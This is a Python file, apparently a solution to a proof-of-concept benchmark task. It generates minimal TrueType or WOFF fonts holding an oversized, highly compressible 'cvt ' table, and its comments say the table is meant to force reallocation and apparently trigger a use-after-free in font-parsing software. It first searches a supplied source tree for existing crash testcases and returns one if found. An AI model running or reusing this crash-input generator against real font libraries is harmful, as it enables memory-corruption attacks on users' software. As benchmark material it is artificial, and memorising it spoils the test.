import os
import re
import tarfile
import struct
import zlib
from typing import Dict, Optional, Tuple, Iterable


def _u16(n: int) -> bytes:
    return struct.pack(">H", n & 0xFFFF)


def _s16(n: int) -> bytes:
    return struct.pack(">h", int(n))


def _u32(n: int) -> bytes:
    return struct.pack(">I", n & 0xFFFFFFFF)


def _s64(n: int) -> bytes:
    return struct.pack(">q", int(n))


def _pad4_len(n: int) -> int:
    return (n + 3) & ~3


def _pad4_bytes(data: bytes) -> bytes:
    return data + (b"\x00" * ((_pad4_len(len(data)) - len(data)) & 3))


def _calc_checksum(data: bytes) -> int:
    padded = _pad4_bytes(data)
    s = 0
    for (v,) in struct.iter_unpack(">I", padded):
        s = (s + v) & 0xFFFFFFFF
    return s


def _make_head(checksum_adjustment: int = 0) -> bytes:
    # 'head' table, 54 bytes
    return b"".join(
        [
            _u32(0x00010000),  # version
            _u32(0x00010000),  # fontRevision
            _u32(checksum_adjustment),  # checkSumAdjustment
            _u32(0x5F0F3CF5),  # magicNumber
            _u16(0),  # flags
            _u16(1000),  # unitsPerEm
            _s64(0),  # created
            _s64(0),  # modified
            _s16(0),  # xMin
            _s16(0),  # yMin
            _s16(0),  # xMax
            _s16(0),  # yMax
            _u16(0),  # macStyle
            _u16(0),  # lowestRecPPEM
            _s16(2),  # fontDirectionHint
            _s16(0),  # indexToLocFormat (short)
            _s16(0),  # glyphDataFormat
        ]
    )


def _make_hhea() -> bytes:
    # 'hhea' table, 36 bytes
    return b"".join(
        [
            _u32(0x00010000),  # version
            _s16(800),  # ascent
            _s16(-200),  # descent
            _s16(0),  # lineGap
            _u16(500),  # advanceWidthMax
            _s16(0),  # minLeftSideBearing
            _s16(0),  # minRightSideBearing
            _s16(500),  # xMaxExtent
            _s16(1),  # caretSlopeRise
            _s16(0),  # caretSlopeRun
            _s16(0),  # caretOffset
            _s16(0),
            _s16(0),
            _s16(0),
            _s16(0),  # reserved[4]
            _s16(0),  # metricDataFormat
            _u16(1),  # numberOfHMetrics
        ]
    )


def _make_maxp() -> bytes:
    # 'maxp' table, 32 bytes for version 1.0
    return b"".join(
        [
            _u32(0x00010000),  # version
            _u16(1),  # numGlyphs
            _u16(0),  # maxPoints
            _u16(0),  # maxContours
            _u16(0),  # maxCompositePoints
            _u16(0),  # maxCompositeContours
            _u16(1),  # maxZones
            _u16(0),  # maxTwilightPoints
            _u16(0),  # maxStorage
            _u16(0),  # maxFunctionDefs
            _u16(0),  # maxInstructionDefs
            _u16(0),  # maxStackElements
            _u16(0),  # maxSizeOfInstructions
            _u16(0),  # maxComponentElements
            _u16(0),  # maxComponentDepth
        ]
    )


def _make_hmtx() -> bytes:
    # 'hmtx' table, 4 bytes, one metric
    return b"".join([_u16(500), _s16(0)])


def _make_glyf_and_loca() -> Tuple[bytes, bytes]:
    # One empty glyph (10 bytes), pad to 4 => 12
    glyf = b"".join([_s16(0), _s16(0), _s16(0), _s16(0), _s16(0)])
    glyf_padded = _pad4_bytes(glyf)
    # short loca: (numGlyphs+1)=2 entries, offsets/2: [0, len(glyf_padded)/2]
    loca = b"".join([_u16(0), _u16(len(glyf_padded) // 2)])
    return glyf_padded, loca


def _make_cmap() -> bytes:
    # Minimal cmap with a format 0 subtable for (platform 3, encoding 1)
    glyph_ids = bytes(256)  # all map to glyph 0
    subtable = b"".join([_u16(0), _u16(262), _u16(0), glyph_ids])  # fmt, length, language, array
    cmap = b"".join([_u16(0), _u16(1), _u16(3), _u16(1), _u32(12), subtable])
    return _pad4_bytes(cmap)


def _make_name() -> bytes:
    # Minimal name table, one record, "A" (UTF-16BE)
    string = b"\x00\x41"
    name = b"".join(
        [
            _u16(0),  # format
            _u16(1),  # count
            _u16(18),  # stringOffset
            _u16(3),  # platformID
            _u16(1),  # encodingID
            _u16(0x0409),  # languageID
            _u16(1),  # nameID
            _u16(len(string)),  # length
            _u16(0),  # offset
            string,
        ]
    )
    return _pad4_bytes(name)


def _make_post() -> bytes:
    # post format 3.0, 32 bytes
    return b"".join(
        [
            _u32(0x00030000),  # format
            _u32(0),  # italicAngle
            _s16(0),  # underlinePosition
            _s16(0),  # underlineThickness
            _u32(0),  # isFixedPitch
            _u32(0),  # minMemType42
            _u32(0),  # maxMemType42
            _u32(0),  # minMemType1
            _u32(0),  # maxMemType1
        ]
    )


def _make_os2() -> bytes:
    # OS/2 version 0, 78 bytes
    panose = bytes(10)
    return b"".join(
        [
            _u16(0),  # version
            _s16(500),  # xAvgCharWidth
            _u16(400),  # usWeightClass
            _u16(5),  # usWidthClass
            _u16(0),  # fsType
            _s16(0),  # ySubscriptXSize
            _s16(0),  # ySubscriptYSize
            _s16(0),  # ySubscriptXOffset
            _s16(0),  # ySubscriptYOffset
            _s16(0),  # ySuperscriptXSize
            _s16(0),  # ySuperscriptYSize
            _s16(0),  # ySuperscriptXOffset
            _s16(0),  # ySuperscriptYOffset
            _s16(0),  # yStrikeoutSize
            _s16(0),  # yStrikeoutPosition
            _s16(0),  # sFamilyClass
            panose,  # panose[10]
            _u32(0),  # ulUnicodeRange1
            _u32(0),  # ulUnicodeRange2
            _u32(0),  # ulUnicodeRange3
            _u32(0),  # ulUnicodeRange4
            b"NONE",  # achVendID[4]
            _u16(0x0040),  # fsSelection (REGULAR bit is 6)
            _u16(0),  # usFirstCharIndex
            _u16(0x007F),  # usLastCharIndex
            _s16(800),  # sTypoAscender
            _s16(-200),  # sTypoDescender
            _s16(0),  # sTypoLineGap
            _u16(800),  # usWinAscent
            _u16(200),  # usWinDescent
        ]
    )


def _build_min_tables(cvt_len: int = 0, for_woff: bool = True) -> Dict[bytes, bytes]:
    # If for_woff: head.checkSumAdjustment must be 0 (WOFF spec)
    head = _make_head(0 if for_woff else 0)
    hhea = _make_hhea()
    maxp = _make_maxp()
    hmtx = _make_hmtx()
    glyf, loca = _make_glyf_and_loca()
    cmap = _make_cmap()
    name = _make_name()
    post = _make_post()
    os2 = _make_os2()

    tables = {
        b"cmap": cmap,
        b"glyf": glyf,
        b"head": head,
        b"hhea": hhea,
        b"hmtx": hmtx,
        b"loca": loca,
        b"maxp": maxp,
        b"name": name,
        b"OS/2": os2,
        b"post": post,
    }
    if cvt_len > 0:
        if cvt_len & 1:
            cvt_len += 1
        tables[b"cvt "] = b"\x00" * cvt_len
    return tables


def _build_woff(tables: Dict[bytes, bytes]) -> bytes:
    tags = sorted(tables.keys())
    num_tables = len(tags)

    comp_data: Dict[bytes, bytes] = {}
    comp_len: Dict[bytes, int] = {}
    orig_len: Dict[bytes, int] = {}
    orig_checksum: Dict[bytes, int] = {}

    for tag in tags:
        orig = tables[tag]
        o_len = len(orig)
        orig_len[tag] = o_len
        orig_checksum[tag] = _calc_checksum(orig)

        c = zlib.compress(orig, 9)
        if len(c) < o_len:
            comp_data[tag] = c
            comp_len[tag] = len(c)
        else:
            comp_data[tag] = orig
            comp_len[tag] = o_len

    total_sfnt_size = 12 + 16 * num_tables + sum(_pad4_len(orig_len[t]) for t in tags)

    header_size = 44
    dir_size = 20 * num_tables
    offset = header_size + dir_size

    entries = []
    data_blocks = bytearray()
    for tag in tags:
        data = comp_data[tag]
        off = offset + len(data_blocks)
        entries.append((tag, off, comp_len[tag], orig_len[tag], orig_checksum[tag]))
        data_blocks += data
        if len(data_blocks) & 3:
            data_blocks += b"\x00" * (4 - (len(data_blocks) & 3))

    total_len = header_size + dir_size + len(data_blocks)

    header = struct.pack(
        ">4sIIHHIHHIIIII",
        b"wOFF",
        0x00010000,  # flavor
        total_len,
        num_tables,
        0,  # reserved
        total_sfnt_size,
        1,  # majorVersion
        0,  # minorVersion
        0, 0, 0,  # metaOffset/Length/OrigLength
        0, 0,  # privOffset/Length
    )

    directory = bytearray()
    for tag, off, c_len, o_len, chk in entries:
        directory += struct.pack(">4sIIII", tag, off, c_len, o_len, chk)

    return bytes(header + directory + data_blocks)


def _build_ttf(tables: Dict[bytes, bytes]) -> bytes:
    tags = sorted(tables.keys())
    num_tables = len(tags)
    max_power2 = 1
    entry_selector = 0
    while (max_power2 << 1) <= num_tables:
        max_power2 <<= 1
        entry_selector += 1
    search_range = max_power2 * 16
    range_shift = num_tables * 16 - search_range

    # Prepare offsets
    header_size = 12
    dir_size = 16 * num_tables
    offset = header_size + dir_size
    offsets: Dict[bytes, int] = {}
    lengths: Dict[bytes, int] = {}
    checksums: Dict[bytes, int] = {}

    table_data = bytearray()
    for tag in tags:
        data = tables[tag]
        lengths[tag] = len(data)
        checksums[tag] = _calc_checksum(data)
        offsets[tag] = offset + len(table_data)
        table_data += data
        if len(table_data) & 3:
            table_data += b"\x00" * (4 - (len(table_data) & 3))

    offset_table = struct.pack(">IHHHH", 0x00010000, num_tables, search_range, entry_selector, range_shift)

    directory = bytearray()
    for tag in tags:
        directory += struct.pack(">4sIII", tag, checksums[tag], offsets[tag], lengths[tag])

    font = bytearray(offset_table + directory + table_data)

    # Patch checkSumAdjustment in head to make whole font checksum match constant
    if b"head" in tables:
        head_off = offsets[b"head"]
        # Set checkSumAdjustment to 0 first
        font[head_off + 8:head_off + 12] = b"\x00\x00\x00\x00"
        total_sum = _calc_checksum(bytes(font))
        adj = (0xB1B0AFBA - total_sum) & 0xFFFFFFFF
        font[head_off + 8:head_off + 12] = _u32(adj)

        # Update head table checksum in directory
        new_head_data = bytes(font[head_off:head_off + lengths[b"head"]])
        new_head_chk = _calc_checksum(new_head_data)
        # Find head entry index
        idx = tags.index(b"head")
        entry_off = 12 + idx * 16  # in sfnt, directory starts at 12
        font[entry_off + 4:entry_off + 8] = _u32(new_head_chk)

    return bytes(font)


def _iter_source_texts_from_tar(tf: tarfile.TarFile) -> Iterable[str]:
    exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".inl", ".m", ".mm")
    for m in tf.getmembers():
        if not m.isfile():
            continue
        name = m.name.lower()
        if not name.endswith(exts):
            continue
        if m.size <= 0 or m.size > 2_000_000:
            continue
        f = tf.extractfile(m)
        if not f:
            continue
        try:
            b = f.read()
        except Exception:
            continue
        yield b.decode("utf-8", "ignore")


def _iter_source_texts_from_dir(root: str) -> Iterable[str]:
    exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".inc", ".inl", ".m", ".mm")
    for base, _, files in os.walk(root):
        for fn in files:
            lfn = fn.lower()
            if not lfn.endswith(exts):
                continue
            path = os.path.join(base, fn)
            try:
                st = os.stat(path)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > 2_000_000:
                continue
            try:
                with open(path, "rb") as f:
                    b = f.read()
            except Exception:
                continue
            yield b.decode("utf-8", "ignore")


def _find_embedded_poc_in_tar(src_path: str) -> Optional[bytes]:
    name_keywords = ("crash", "poc", "clusterfuzz", "repro", "uaf", "asan", "919", "testcase")
    exts = (".ttf", ".otf", ".woff", ".woff2", ".bin", ".dat", ".fnt", ".font")
    try:
        with tarfile.open(src_path, "r:*") as tf:
            candidates = []
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                n = m.name.lower()
                if m.size <= 0 or m.size > 5_000_000:
                    continue
                if not (n.endswith(exts) or any(k in n for k in name_keywords)):
                    continue
                f = tf.extractfile(m)
                if not f:
                    continue
                try:
                    data = f.read()
                except Exception:
                    continue
                if len(data) < 4:
                    continue
                sig = data[:4]
                looks_font = sig in (b"wOFF", b"wOF2", b"OTTO", b"true", b"typ1", b"ttcf") or sig == b"\x00\x01\x00\x00"
                if not looks_font and not any(k in n for k in name_keywords):
                    continue
                prio = 0
                for k in name_keywords:
                    if k in n:
                        prio += 1
                candidates.append((prio, len(data), data))
            if not candidates:
                return None
            candidates.sort(key=lambda x: (-x[0], x[1]))
            return candidates[0][2]
    except Exception:
        return None


def _find_embedded_poc_in_dir(src_dir: str) -> Optional[bytes]:
    name_keywords = ("crash", "poc", "clusterfuzz", "repro", "uaf", "asan", "919", "testcase")
    exts = (".ttf", ".otf", ".woff", ".woff2", ".bin", ".dat", ".fnt", ".font")
    candidates = []
    for base, _, files in os.walk(src_dir):
        for fn in files:
            lfn = fn.lower()
            if not (lfn.endswith(exts) or any(k in lfn for k in name_keywords)):
                continue
            path = os.path.join(base, fn)
            try:
                st = os.stat(path)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > 5_000_000:
                continue
            try:
                with open(path, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            if len(data) < 4:
                continue
            sig = data[:4]
            looks_font = sig in (b"wOFF", b"wOF2", b"OTTO", b"true", b"typ1", b"ttcf") or sig == b"\x00\x01\x00\x00"
            if not looks_font and not any(k in lfn for k in name_keywords):
                continue
            prio = sum(1 for k in name_keywords if k in lfn)
            candidates.append((prio, len(data), data))
    if not candidates:
        return None
    candidates.sort(key=lambda x: (-x[0], x[1]))
    return candidates[0][2]


def _source_supports_woff(src_path: str) -> bool:
    def check_texts(texts: Iterable[str]) -> bool:
        for t in texts:
            if "wOFF" in t or "WOFF" in t or "ProcessWOFF" in t or "kWoff" in t:
                return True
        return False

    if os.path.isdir(src_path):
        return check_texts(_iter_source_texts_from_dir(src_path))
    try:
        with tarfile.open(src_path, "r:*") as tf:
            return check_texts(_iter_source_texts_from_tar(tf))
    except Exception:
        return True


class Solution:
    def solve(self, src_path: str) -> bytes:
        if os.path.isdir(src_path):
            embedded = _find_embedded_poc_in_dir(src_path)
        else:
            embedded = _find_embedded_poc_in_tar(src_path)
        if embedded is not None:
            return embedded

        supports_woff = _source_supports_woff(src_path)

        # Use a large, highly-compressible 'cvt ' table to force big output writes with small input (WOFF).
        cvt_len = 131072  # 128 KiB; large enough to force realloc/move in typical implementations

        if supports_woff:
            tables = _build_min_tables(cvt_len=cvt_len, for_woff=True)
            return _build_woff(tables)

        # Fallback: build a TTF (larger on disk) with a moderate 'cvt ' table to still trigger big writes.
        tables = _build_min_tables(cvt_len=32768, for_woff=False)
        return _build_ttf(tables)